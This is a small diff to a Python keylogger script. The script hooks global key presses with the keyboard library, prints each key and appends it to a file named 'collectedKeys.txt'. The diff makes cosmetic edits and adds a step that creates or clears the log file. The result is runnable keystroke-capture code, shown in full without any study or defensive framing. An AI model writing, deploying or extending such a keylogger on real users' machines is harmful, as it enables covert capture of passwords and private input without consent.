@@ -10,16 +10,20 @@ def on_key_press(event):
     # Print the pressed key
     print(event.name)
 
-    # Save the pressed key to a file
+    # Save the pressed key to the file
     save_content(event.name, "collectedKeys.txt")
 
 # Function to save content to a file
 def save_content(content, filename):
     # Write content to the file
     with open(filename, 'a') as file:  # Use 'a' mode to append content to the file
-        file.write(content )
+        file.write(content)
 
     print(f"Key saved to {filename}")
+
+# Create the file to store the pressed keys
+filename = "collectedKeys.txt"
+open(filename, 'w').close()  # Create an empty file or clear existing content
 
 # Start the keyboard listener
 keyboard.on_press(on_key_press)
